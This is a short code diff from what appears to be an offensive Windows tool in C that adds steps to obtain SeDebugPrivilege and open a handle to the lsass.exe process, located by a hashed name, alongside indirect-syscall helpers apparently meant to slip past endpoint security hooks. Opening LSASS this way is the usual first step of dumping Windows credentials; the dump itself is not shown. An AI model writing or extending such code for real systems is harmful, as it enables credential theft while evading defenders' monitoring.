@@ -11,6 +11,10 @@ int main() {
     PVOID   pAddress  = NULL;
     SIZE_T  memSize   = 4096;
 
+    DWORD   dwLSASSId = 0;
+    HANDLE  hLSASS    = NULL;
+
+
     AddWin32uToIat();
     if (!InitSyscalls()) {
         return 0;
@@ -18,6 +22,10 @@ int main() {
 
     if (!SetSeDebugPrivilege()) {
         printf("[!] Failed to set SeDebugPrivilege\n");
+    }
+
+    if (!GetProcessHandle(HASHW(L"lsass.exe"), &dwLSASSId, &hLSASS)) {
+        printf("[!] Failed to get process handle\n");
     }
 
     Instance->Win32.Api.NtAllocateVirtualMemory.ProxyCall(
